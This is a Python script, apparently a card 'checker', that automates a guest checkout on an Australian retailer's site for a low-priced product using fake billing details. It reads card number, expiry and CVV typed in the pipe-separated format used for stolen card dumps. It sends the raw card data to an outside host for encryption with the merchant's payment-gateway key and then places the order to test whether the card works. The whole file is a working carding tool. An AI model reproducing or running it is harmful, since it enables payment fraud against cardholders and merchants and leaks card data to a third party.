import requests
r = requests.Session()


card = input('Enter card number:')
cc,mm,yy,cvv = card.split('|')
def getstr(data, start, end):
    return data.split(start)[1].split(end)[0]

headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    #'cookie': '_gcl_au=1.1.171639662.1729774615; frontend=jgeqmujpltt1abbhfkvl5v6256; frontend_cid=A5uQNplqZ0Gwd9Rf; _gid=GA1.3.312785811.1730983643; _clck=zr735e%7C2%7Cfqo%7C0%7C1758; _ga=GA1.1.1264233995.1729774614; _uetsid=6efacc509d0611efa967c71fd3bd3bea; _uetvid=71b603f0920711efa0123f540d3fab9e; _clsk=1ljc82l%7C1730983751190%7C11%7C1%7Ck.clarity.ms%2Fcollect; _ga_VYT6B8GN9Q=GS1.1.1730983643.3.1.1730983765.60.0.0',
    'origin': 'https://www.kahuna.com.au',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.kahuna.com.au/kahuna-kids-safety-non-slip-trampoline-socks-small',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

data = {
  'width': '1536',
  'prodid': '111',
  'referrer': '',
  'ref': 'https://www.kahuna.com.au/kahuna-kids-safety-non-slip-trampoline-socks-small',
  'pagedata[shareTitle]': 'Kahuna Kids Safety Non-Slip Trampoline Socks Small | Kahuna',
  'pagedata[shareDescription]': 'I found this on Kahuna ...',
  'pagedata[shareUrl]': 'https://www.kahuna.com.au/kahuna-kids-safety-non-slip-trampoline-socks-small',
  'pagedata[catname]': 'Accessories',
  'pagedata[prodid]': '111',
  'pagedata[productPrice]': '9',
  'pagedata[sku]': 'kah-sks-s',
  'pagedata[available]': '1',
  'pagedata[pagetype]': 'product',
  'pagedata[img]': 'L21lZGlhL2NhdGFsb2cvcHJvZHVjdC9jYWNoZS82MjUvOTAvdC9yL3RyYS1rYWgtc29ja3NfZ18xLmpwZw=='
}

response = r.post('https://www.kahuna.com.au/ajaxcart/loader/load/', headers=headers, data=data)
key = getstr(response.text, '"value":"', '"').strip()
print(key)
headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'frontend=7g3j5qkfsb9nleg6buune90ga5; frontend_cid=xZc2Odr0hDM8mro6; _gid=GA1.3.1000227481.1729774614; _gat_gtag_UA_127199242_1=1; _uetsid=71b5b810920711ef8634ff50657a21bf; _uetvid=71b603f0920711efa0123f540d3fab9e; _ga_VYT6B8GN9Q=GS1.1.1729774614.1.0.1729774614.60.0.0; _ga=GA1.1.1264233995.1729774614; _gcl_au=1.1.171639662.1729774615; _clck=zr735e%7C2%7Cfqa%7C0%7C1758; _clsk=1xpj4sa%7C1729774616712%7C1%7C1%7Cd.clarity.ms%2Fcollect',
    'origin': 'https://www.kahuna.com.au',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.kahuna.com.au/kahuna-kids-safety-non-slip-trampoline-socks-small',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

data = {
    'product': '111',
    'related_product': '',
    'qty': '1',
    'isAjax': '1',
    'form_key': key,
}

response = r.post('https://www.kahuna.com.au/ajaxcart/index/add/', headers=headers, data=data)
headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    # 'cookie': 'frontend=7g3j5qkfsb9nleg6buune90ga5; frontend_cid=xZc2Odr0hDM8mro6; _gid=GA1.3.1000227481.1729774614; _gcl_au=1.1.171639662.1729774615; _clck=zr735e%7C2%7Cfqa%7C0%7C1758; _gat_gtag_UA_127199242_1=1; _uetsid=71b5b810920711ef8634ff50657a21bf; _uetvid=71b603f0920711efa0123f540d3fab9e; _ga_VYT6B8GN9Q=GS1.1.1729774614.1.1.1729774750.59.0.0; _ga=GA1.1.1264233995.1729774614; _clsk=1xpj4sa%7C1729774751664%7C5%7C1%7Cd.clarity.ms%2Fcollect',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.kahuna.com.au/kahuna-kids-safety-non-slip-trampoline-socks-small',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
}

response = r.get('https://www.kahuna.com.au/checkout/onepage/', headers=headers)

headers = {
    'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    #'cookie': 'frontend=7g3j5qkfsb9nleg6buune90ga5; frontend_cid=xZc2Odr0hDM8mro6; _gid=GA1.3.1000227481.1729774614; _gcl_au=1.1.171639662.1729774615; _clck=zr735e%7C2%7Cfqa%7C0%7C1758; _uetsid=71b5b810920711ef8634ff50657a21bf; _uetvid=71b603f0920711efa0123f540d3fab9e; _ga_VYT6B8GN9Q=GS1.1.1729774614.1.1.1729774793.16.0.0; _ga=GA1.1.1264233995.1729774614; _clsk=1xpj4sa%7C1729774794673%7C6%7C1%7Cd.clarity.ms%2Fcollect',
    'origin': 'https://www.kahuna.com.au',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.kahuna.com.au/checkout/onepage/',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'x-prototype-version': '1.7.3',
    'x-requested-with': 'XMLHttpRequest',
}

data = {
  'method': 'guest'
}

response = r.post('https://www.kahuna.com.au/checkout/onepage/saveMethod/', headers=headers, data=data)
print(response.text)
headers = {
    'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_gcl_au=1.1.171639662.1729774615; frontend=jgeqmujpltt1abbhfkvl5v6256; frontend_cid=A5uQNplqZ0Gwd9Rf; _gid=GA1.3.312785811.1730983643; _clck=zr735e%7C2%7Cfqo%7C0%7C1758; _uetsid=6efacc509d0611efa967c71fd3bd3bea; _uetvid=71b603f0920711efa0123f540d3fab9e; _ga_VYT6B8GN9Q=GS1.1.1730983643.3.1.1730984227.52.0.0; _ga=GA1.1.1264233995.1729774614; _clsk=1ljc82l%7C1730984228305%7C13%7C1%7Ck.clarity.ms%2Fcollect',
    'origin': 'https://www.kahuna.com.au',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.kahuna.com.au/checkout/onepage/',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'x-prototype-version': '1.7.3',
    'x-requested-with': 'XMLHttpRequest',
}

data = {
    'billing[address_id]': '',
    'billing[firstname]': 'Albedo',
    'billing[lastname]': 'Jones',
    'billing[country_id]': 'AU',
    'billing[region]': 'NSW',
    'billing[save_in_address_book]': '1',
    'billing[use_for_shipping]': '1',
    'form_key': key,
    'fullname': 'Albedo Jones',
    'billing[street][]': [
        'New York',
        '',
    ],
    'billing[city]': 'New York',
    'billing[postcode]': '1008',
    'billing[email]': 'rochbd@gmail.com',
    'billing[telephone]': '77588954786',
    'billing[customer_password]': '',
    'billing[confirm_password]': '',
    'billing[region_id]': '',
}

response = r.post('https://www.kahuna.com.au/checkout/onepage/saveBilling/', headers=headers, data=data)

data = {
    'shipping_method': 'freeshipping_freeshipping',
    'form_key': key,
}

response = r.post(
    'https://www.kahuna.com.au/checkout/onepage/saveShippingMethod/',
    headers=headers,
    data=data,
)

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
}
eway_key = 'wMNkkSMDWy2peB7WsUA4JBFsVdiqWuFvEKeE5UvvNnSKOx5YvFnAvQyc/B5vATFNG2uxwfzgeLLiLRml+TjHOmR2uxNoGRdmocMnIKr93IxiAxHQcvLjVH2/+jQMwcX5cDOEFaLfv0rEyBt/nIisWrCIcjKrA9ilCPWK69Y3lpXJJ2b5eTScgPHwfIM8t9iFm/wE+89mz1Fd+y0AAR/9qovXQX8BVZvWBq6jy6SGt03bKQN+WhUbCQrVylI9C3IYBrQkvEutaRNKJz1ikfB082t7s2OZqFVLG6Vua55hu5fCTNl26Pz82HfoUwltNJCP6nUOcE9BwWZyReHFHVvsPQ=='
response = requests.get(
    f'https://asianprozyy.us/encrypt/eway?card={cc}|{mm}|{yy}|{cvv}&ewayKey={eway_key}',
    headers=headers,
)
encrypt_cc = response.json()['encryptedCard']
encrypt_cvv = response.json()['encryptedCvv']
print(encrypt_cc)
print(encrypt_cvv)
headers = {
    'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    #'cookie': 'frontend=7g3j5qkfsb9nleg6buune90ga5; frontend_cid=xZc2Odr0hDM8mro6; _gid=GA1.3.1000227481.1729774614; _gcl_au=1.1.171639662.1729774615; _clck=zr735e%7C2%7Cfqa%7C0%7C1758; _uetsid=71b5b810920711ef8634ff50657a21bf; _uetvid=71b603f0920711efa0123f540d3fab9e; _ga_VYT6B8GN9Q=GS1.1.1729774614.1.1.1729774793.16.0.0; _ga=GA1.1.1264233995.1729774614; _clsk=1xpj4sa%7C1729774794673%7C6%7C1%7Cd.clarity.ms%2Fcollect',
    'origin': 'https://www.kahuna.com.au',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.kahuna.com.au/checkout/onepage/',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'x-prototype-version': '1.7.3',
    'x-requested-with': 'XMLHttpRequest',
}

data = {
  'payment[method]': 'ewayrapid_ewayone',
  'payment[cc_owner]': 'Ayan',
  'payment[cc_number]': f'eCrypted:{encrypt_cc}',
  'payment[cc_type]': 'VI',
  'payment[cc_exp_month]': str(int(mm)),
  'payment[cc_exp_year]': yy,
  'payment[cc_cid]': f'eCrypted:{encrypt_cvv}',
  'form_key': key
}

response = r.post('https://www.kahuna.com.au/checkout/onepage/savePayment/', headers=headers, data=data)

headers = {
    'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'frontend=7g3j5qkfsb9nleg6buune90ga5; frontend_cid=xZc2Odr0hDM8mro6; _gid=GA1.3.1000227481.1729774614; _gcl_au=1.1.171639662.1729774615; _clck=zr735e%7C2%7Cfqa%7C0%7C1758; _uetsid=71b5b810920711ef8634ff50657a21bf; _uetvid=71b603f0920711efa0123f540d3fab9e; _ga_VYT6B8GN9Q=GS1.1.1729774614.1.1.1729774793.16.0.0; _ga=GA1.1.1264233995.1729774614; _clsk=1xpj4sa%7C1729775897293%7C7%7C1%7Cd.clarity.ms%2Fcollect',
    'origin': 'https://www.kahuna.com.au',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.kahuna.com.au/checkout/onepage/',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'x-prototype-version': '1.7.3',
    'x-requested-with': 'XMLHttpRequest',
}

data = {
    'payment[method]': 'ewayrapid_ewayone',
    'payment[cc_owner]': 'Ayan',
    'payment[cc_number]': f'eCrypted:{encrypt_cc}',
    'payment[cc_type]': 'VI',
    'payment[cc_exp_month]': str(int(mm)),
    'payment[cc_exp_year]': yy,
    'payment[cc_cid]': f'eCrypted:{encrypt_cvv}',
    'form_key': key,
}

response = r.post(
    f'https://www.kahuna.com.au/checkout/onepage/saveOrder/form_key/{key}/',
    headers=headers,
    data=data,
)
print(response.text)